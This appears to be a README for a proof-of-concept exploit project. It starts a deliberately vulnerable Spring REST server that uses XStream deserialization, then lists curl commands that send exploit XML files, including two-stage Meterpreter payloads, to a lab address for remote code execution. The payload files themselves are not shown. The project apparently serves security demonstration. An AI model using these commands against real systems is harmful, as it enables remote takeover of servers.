## XStreamServer

RCE Exploit PoC for Spring based RESTFul APIs using XStream as Unmarshaler

Start the server using the maven jetty plugin:
mvn -Djetty.port=8080 -DDebug clean  jetty:run

# Expected use:
curl --header "content-type: application/xml" --data @contact.xml "http://192.168.239.147:8080/contacts"

# Exploit knowing the interface:
curl --header "content-type: application/xml" --data @exploit-interface.xml "http://192.168.239.147:8080/contacts"

# Generic Exploit:
curl --header "content-type: application/xml" --data @exploit-general.xml "http://192.168.239.147:8080/contacts"

# Meterpreter Exploit:

curl --header "content-type: application/xml" --data @meterpreter-stage1.xml "http://192.168.239.147:8080/contacts"
curl --header "content-type: application/xml" --data @meterpreter-stage2.xml "http://192.168.239.147:8080/contacts"

curl --header "content-type: application/xml" --data @meterpreter-iface-stage1.xml "http://192.168.239.147:8080/contacts"
curl --header "content-type: application/xml" --data @meterpreter-iface-stage2.xml "http://192.168.239.147:8080/contacts"

